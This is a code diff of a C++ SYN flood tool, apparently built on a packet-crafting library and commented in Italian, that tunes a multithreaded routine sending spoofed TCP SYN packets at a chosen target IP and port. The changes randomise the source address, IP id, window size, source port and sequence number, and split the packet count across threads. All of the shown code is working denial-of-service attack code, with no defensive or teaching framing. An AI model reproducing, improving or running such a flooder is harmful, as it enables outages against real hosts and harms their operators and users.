@@ -24,36 +24,45 @@ IPv4Address SynFlood::random_ip_address(){
 }
 
 
+
 void SynFlood::syn_flood(IPv4Address dst_ip, uint16_t dst_port, unsigned counter) {
     NetworkInterface interface = NetworkInterface::default_interface();
+    NetworkInterface::Info info = interface.addresses();
     PacketSender sender;
     init_random();
-    EthernetII eth = EthernetII() / IP(dst_ip, random_ip_address()) / TCP(dst_port, rand() % 65535);
-    IP *ip = eth.find_pdu<IP>();
-    TCP *tcp = eth.find_pdu<TCP>();
+
+    IP ip = IP(dst_ip, random_ip_address()) / TCP(dst_port, rand() % 65535);
+
+    TCP *tcp = ip.find_pdu<TCP>();
     tcp->set_flag(TCP::SYN, 1);
 
     for(int i=0; i<counter; i++){
-        // per ogni syn inviato cambio l'indirizzo ip sorgente
-        ip->src_addr(random_ip_address());
+        // per ogni syn inviato cambio l'indirizzo ip sorgente e id
+        ip.src_addr(random_ip_address());
+        ip.id(rand()%65536);
 
         // per ogni syn inviato cambio scelgo un numero random
         // per la grandezza della finestra di trasmissione e
         // la porta in uscita
-//        tcp->window(1000 + rand() % 65535);
+        tcp->window(1000 + rand() % 65535);
         tcp->sport(rand() % 65535);
         tcp->seq((rand()%65536)*(rand()%65536));
 
         // mando il pacchetto
-        sender.send(eth, interface);
+        sender.send(ip, interface);
     }
 }
 
 void SynFlood::run(){
+    NetworkInterface interface = NetworkInterface::default_interface();
+    std::cout << "Used interface: " << interface.name() << std::endl;
+    std::cout << "Threads: " << threads_number << std::endl;
+
     std::vector<std::thread> threads;
     auto start = std::chrono::steady_clock::now();
+    threads.reserve(threads_number);
     for(int i=0; i<threads_number; i++){
-        threads.emplace_back(syn_flood, dst_ip, dst_port, counter);
+        threads.emplace_back(syn_flood, dst_ip, dst_port, (int)(counter/threads_number));
     }
     for(std::thread &t: threads){
         t.join();
